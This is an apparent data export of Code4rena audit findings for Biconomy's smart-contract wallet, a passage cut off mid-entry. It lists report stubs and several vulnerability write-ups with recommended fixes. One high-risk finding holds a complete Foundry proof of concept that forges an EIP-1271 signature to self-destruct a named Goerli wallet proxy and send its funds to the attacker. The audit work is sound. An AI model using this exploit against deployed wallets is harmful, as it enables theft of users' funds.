[here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/shark-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/266", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ast3ros-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/257", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-29"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MyFDsYours-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/255", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-30"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xAgro-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/252", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-31"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/2997ms-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/251", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-32"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/SaharDevep-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/248", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-13"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/247", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-33"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "Transaction can fail due to batchId collision", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/246", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216   # Vulnerability details  ## Impact  The protocol supports 2D nonces through a `batchId` mechanism.  Due to different ways to execute transaction on the wallet there could be a collision between `batchIds` being used.  This can result in unexpected failing of transactions  ## Proof of Concept  There are two main ways to execute transaction from the smart wallet  1. Via EntryPoint - calls `execFromEntryPoint`/`execute` 2. Via `execTransaction`  `SmartAccount` has locked the `batchId` #0  to be used by the `EntryPoint`. When an `EntryPoint` calls `validateUserOp` before execution, the hardcoded nonce of `batchId` #0 will be incremented and validated, https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L501 ```     // @notice Nonce space is locked to 0 for AA transactions     // userOp could have batchId as well     function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {         require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");     } ```  Calls to `execTransaction` are more immediate and are likely to be executed before a `UserOp` through `EntryPoint`. There is no limitation in `execTransaction` to use `batchId` #0 although it should be called only by `EntryPoint`.  If there is a call to `execTransaction` with `batchId` set to `0`. It will increment the nonce and `EntryPoint` transactions will revert. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216 ```     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { -------             nonces[batchId]++; -------         }     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  Add a requirement that `batchId` is not `0` in `execTransaction`:  `require(batchId != 0, \"batchId 0 is used only by EntryPoint\")`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/238", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-34"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/zaskoh-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/222", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-26"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/hl_-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/221", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-36"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/sorrynotsorry-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/207", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-35"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MalfurionWhitehat-Q.md)."}, {"title": "VerifyingSingletonPaymaster.validatePaymasterUserOp does not work when sigLength == 64", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/194", "labels": ["bug", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-37"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Openzeppelin canceled support for compact signatures in the ECDSA library after version 4.7.3, that is, it no longer supports recovery of signatures with a length of 64 ```  ## 4.7.3  ### Breaking changes   * `ECDSA`: `recover(bytes32,bytes)` and `tryRecover(bytes32,bytes)` no longer accept compact signatures to prevent malleability. Compact signature support remains available using `recover(bytes32,bytes32,bytes32)` and `tryRecover(bytes32,bytes32,bytes32)`.  ``` And biconomy uses the openzeppelin library above version 4.7.3  ```json     \"@openzeppelin/contracts\": \"^4.7.3\",     \"@openzeppelin/contracts-upgradeable\": \"^4.7.3\", ``` In the VerifyingSingletonPaymaster.validatePaymasterUserOp function, the code indicates that the signature with a length of 64 is still supported, but actually when the user uses a signature with a length of 64 in EntryPoint.handleOps, recover will return 0 address, the require statement fails, and validatePaymasterUserOp cannot work. ```solidity     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"         require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");         return (userOp.paymasterContext(paymasterData), 0);     } ``` ## Proof of Concept https://github.com/OpenZeppelin/openzeppelin-contracts/commit/e1878ace8c2908b85d39f9925c68c6f738cf3325 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/package.json#L61-L62 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L107-L108 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L363-L374 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\" -       require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\"); +       require(sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");         return (userOp.paymasterContext(paymasterData), 0);     } ```"}, {"title": "SmartAccount accesses forbidden opcode on validation", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/192", "labels": ["bug", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-38"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511   # Vulnerability details  ## Impact As specified in the [EIP](https://eips.ethereum.org/EIPS/eip-4337#forbidden-opcodes) certain opcodes are forbidden when a UserOperation is validated because their outputs can differ between simulation and execution. One of those opcodes is `ORIGIN`. The SmartAccount uses that opcode in its validation logic. The client will reject those UserOperations because they are invalid. The wallet won't be usable with EIP-4337.  Because this breaks the main functionality of the wallet I rate it as HIGH.  ## Proof of Concept In `validateUserOp()` the contract calls `_validateSignature()` which in turn accesses `tx.origin` and thus the `ORIGIN` opcode: ```sol     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)     external override virtual returns (uint256 deadline) {         _requireFromEntryPoint();         deadline = _validateSignature(userOp, userOpHash, aggregator);         if (userOp.initCode.length == 0) {             _validateAndUpdateNonce(userOp);         }         _payPrefund(missingAccountFunds);     }      function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)     internal override virtual returns (uint256 deadline) {         bytes32 hash = userOpHash.toEthSignedMessageHash();         //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)         // solhint-disable-next-line avoid-tx-origin         require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");         return 0;     } ```  The EIP specifies that for the simulation, the client calls `EntryPoint.simulateValidation()`. That function calls account's `validateUserOp()` function which triggers the forbidden opcode: https://eips.ethereum.org/EIPS/eip-4337#specification-1  You can find it in the implementation as well: https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/core/EntryPoint.sol#L267-L273  ## Tools Used none  ## Recommended Mitigation Steps There's no real reason to check that `tx.origin == address(0)`. It's not specified in the EIP. Just remove it. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-14"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/177", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xdeadbeef0x-Q.md)."}, {"title": "Arbitrary transactions possible due to insufficient signature validation", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/175", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-04"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  A hacker can create arbitrary transaction through the smart wallet by evading signature validation.   Major impacts: 1. Steal **all** funds from the smart wallet and destroy the proxy 2. Lock the wallet from EOAs by updating the implementation contract  1. New implementation can transfer all funds or hold some kind of ransom  2. New implementation can take time to unstake funds from protocols  ## Proof of Concept  The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342 ``` function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { ---------             checkSignatures(txHash, txHashData, signatures);         } ---------             success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas); ---------         }     }  function checkSignatures(         bytes32 dataHash,         bytes memory data,         bytes memory signatures     ) public view virtual { ----------         if(v == 0) { ----------             _signer = address(uint160(uint256(r))); ----------                 require(uint256(s) >= uint256(1) * 65, \"BSA021\"); ----------                 require(uint256(s) + 32 <= signatures.length, \"BSA022\"); -----------                 assembly {                     contractSignatureLen := mload(add(add(signatures, s), 0x20))                 }                 require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\"); -----------                 require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\"); -----------     } ```  `checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract.   A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.   As `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.  ### Impact #1 - Self destruct and steal all funds  Consider the following scenario: 1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `SelfDestructingContract` that `selfdestruct`s when called 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`  2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Proxy contract is destroyed   1. Hacker received all funds that were in the wallet  ### Impact #2 - Update implementation and lock out EOA    1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)`   2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Implementation was updated to `MaliciousImplementation`  1. Hacker transfers all native and ERC20 tokens to himself  2. Hacker unstakes EOA funds from protocols   3. Hacker might try to ransom the protocol/EOAs to return to previous implementation 5. Proxy cannot be redeployed for the existing EOA  ### Foundry POC  The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.  The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.  The POC use a smart wallet proxy contract that is deployed on `goerli` chain: proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09  You will need to install a foundry. Please follow these instruction for the setup: https://book.getfoundry.sh/getting-started/installation  After installing, create a workdir by issuing the command: `forge init --no-commit`   Create the following file in `test/DestroyWalletAndStealFunds.t.sol`: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\";  contract Enum {     enum Operation {Call, DelegateCall} } interface SmartAccount {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external payable returns (bool success);      function getNonce(uint256 batchId) external view returns (uint256); } struct Transaction {         address to;         uint256 value;         bytes data;         Enum.Operation operation;         uint256 targetTxGas;     } struct FeeRefund {         uint256 baseGas;         uint256 gasPrice; //gasPrice or tokenGasPrice         uint256 tokenGasPriceFactor;         address gasToken;         address payable refundReceiver;     } contract FakeSigner {     bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;      // Always return valid EIP1271_MAGIC_VALUE     function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {         return EIP1271_MAGIC_VALUE;     } } contract SelfDestructingContract {     // All this does is self destruct and send funds to \"to\"     function selfDestruct(address to) external {         selfdestruct(payable(to));     } }  contract DestroyWalletAndStealFunds is Test {     SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);     address hacker = vm.addr(0x1337);     SelfDestructingContract sdc;     FakeSigner fs;     function setUp() public {         // Create self destruct contract         sdc = new SelfDestructingContract();         // Create fake signer         fs = new FakeSigner();          // Impersonate hacker         vm.startPrank(hacker);         // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker          bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);         // Create transaction specifing SelfDestructingContract as target and as a delegate call         Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);         // Create FeeRefund         FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));          bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));         // Add fake signature (r,s,v) to pass all requirments.         // v=0 to indicate eip-1271 signer \"fakeSignerPadded\" which will always return true         bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));         // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.         proxySmartAccount.execTransaction(transaction, 0, fr, signatures);         vm.stopPrank();     }      function testProxyDoesNotExist() public {         uint size;         // Validate that bytecode size of the proxy contract is 0 becuase of self destruct          address proxy = address(proxySmartAccount);         assembly {           size := extcodesize(proxy)         }         assertEq(size,0);     }      function testRevertWhenCallingWalletThroughProxy() public {         // Revert when trying to call a function in the proxy          proxySmartAccount.getNonce(0);     } } ```  To run the POC and validate that the proxy does not exist after destruction: ``` forge test -m testProxyDoesNotExist -v --fork-url=\"<GOERLI FORK RPC>\" ```  Expected output:  ``` Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [PASS] testProxyDoesNotExist() (gas: 4976) Test result: ok. 1 passed; 0 failed; finished in 4.51s ```  To run the POC and validate that the EOA cannot interact with the wallet after destruction: ``` forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url=\"<GOERLI FORK RPC>\" ```  Expected output:  ``` Failing tests: Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092) ```  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  The protocol should validate before calling `isValidSignature` that `_signer` is `owner` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/157", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-40"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "Leak of value when interacting with an enforcer contract", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/154", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed", "duplicate-157"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L36   # Vulnerability details  ### Impact  Proxy.sol is an enforcer of the the user's wallet standard. In its fallback function, it calls the actual implementation in order to handle additional logic.  If Proxy.sol is called with no calldata and some msg.value, the call will reach the receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value.  This logic is never reached, the entire msg.value is just leaked.   ```js contracts/smart-contract-wallet/Proxy.sol:   35     36:     receive() external payable {   37:         emit Received(msg.value, msg.sender, \"\");   38:     } ```  ### Proof Of Concept  Because the implementation contract is a constant , although we can confirm whether the `receive()` function exists, a different vulnerability is exposed this time; Even if the proxy contract can receive ether with `receive()`, there is no withdraw function to withdraw this ether and ethers remain locked in the contract.   ### Recommended Mitigation Steps  Consider moving the `receive()` function to the implementation contract "}, {"title": "Paymaster ETH can be drained with malicious sender", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/151", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Paymaster's signature can be replayed to drain their deposits  ## Proof of Concept  Scenario :  - user A is happy with biconomy and behaves well biconomy gives some sponsored tx using verifyingPaymaster -- let's say paymaster's signature as sig X - user A becomes not happy with biconomy for some reason and A wants to attack biconomy - user A delegate calls to Upgrader and upgrade it's sender contract to MaliciousAccount.sol - MaliciousAccount.sol does not check any nonce and everything else is same to SmartAccount(but they can also add some other details to amplify the attack, but let's just stick it this way) - user A uses sig X(the one that used before) to initiate the same tx over and over - user A earnes nearly nothing but paymaster will get their deposits drained   files : Upgrader.sol, MaliciousAccount.sol, test file https://gist.github.com/leekt/d8fb59f448e10aeceafbd2306aceaab2   ## Tools Used hardhat test, verified with livingrock  ## Recommended Mitigation Steps Since `validatePaymasterUserOp` function is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not   ``` mapping(bytes32 => boolean) public usedHash      function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);         require(!usedHash[hash], \"used hash\");         usedHash[hash] = true; ```"}, {"title": "`FeeRefund.tokenGasPriceFactor` is not included in signed transaction data allowing the submitter to steal funds", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/123", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444   # Vulnerability details  ## Impact The submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) * gasPrice / tokenGasPriceFactor$. `baseGas`, `gasPrice`, and `tokenGasPriceFactor` are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the `tokenGasPriceFactor` value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for `tokenGasPriceFactor`. That way they can increase the actual gas repayment and steal the user's funds.  ## Proof of Concept In `encodeTransactionData()` we can see that `tokenGasPriceFactor` is not included: ```sol     function encodeTransactionData(         Transaction memory _tx,         FeeRefund memory refundInfo,         uint256 _nonce     ) public view returns (bytes memory) {         bytes32 safeTxHash =             keccak256(                 abi.encode(                     ACCOUNT_TX_TYPEHASH,                     _tx.to,                     _tx.value,                     keccak256(_tx.data),                     _tx.operation,                     _tx.targetTxGas,                     refundInfo.baseGas,                     refundInfo.gasPrice,                     refundInfo.gasToken,                     refundInfo.refundReceiver,                     _nonce                 )             );         return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);     } ```  The value is used to determine the gas repayment in `handlePayment()` and `handlePaymentRevert()`: ```sol     function handlePayment(         uint256 gasUsed,         uint256 baseGas,         uint256 gasPrice,         uint256 tokenGasPriceFactor,         address gasToken,         address payable refundReceiver     ) private nonReentrant returns (uint256 payment) {         // uint256 startGas = gasleft();         // solhint-disable-next-line avoid-tx-origin         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;         if (gasToken == address(0)) {             // For ETH we will only adjust the gas price to not be higher than the actual used gas price             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);             (bool success,) = receiver.call{value: payment}(\"\");             require(success, \"BSA011\");         } else {             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);             require(transferToken(gasToken, receiver, payment), \"BSA012\");         }         // uint256 requiredGas = startGas - gasleft();         //console.log(\"hp %s\", requiredGas);     } ```  That's called at the end of `execTransaction()`: ```sol             if (refundInfo.gasPrice > 0) {                 //console.log(\"sent %s\", startGas - gasleft());                 // extraGas = gasleft();                 payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);                 emit WalletHandlePayment(txHash, payment);             } ```  As an example, given that: - `gasUsed = 1,000,000` - `baseGas = 100,000` - `gasPrice = 10,000,000,000` (10 gwei) - `tokenGasPriceFactor = 18`  You get $(1,000,000 + 100,000) * 10,000,000,000 / 18 = 6.1111111e14$. If the submitter executes the transaction with `tokenGasPriceFactor = 1` they get $1.1e16$ instead, i.e. 18 times more. ## Tools Used none  ## Recommended Mitigation Steps `tokenGasPriceFactor` should be included in the encoded transaction data and thus verified by the user's signature."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-15"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/118", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-44"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/115", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-42"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ladboy233-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/113", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-41"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/101", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-45"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/prady-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/86", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-46"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/84", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-47"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/btk-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/80", "labels": 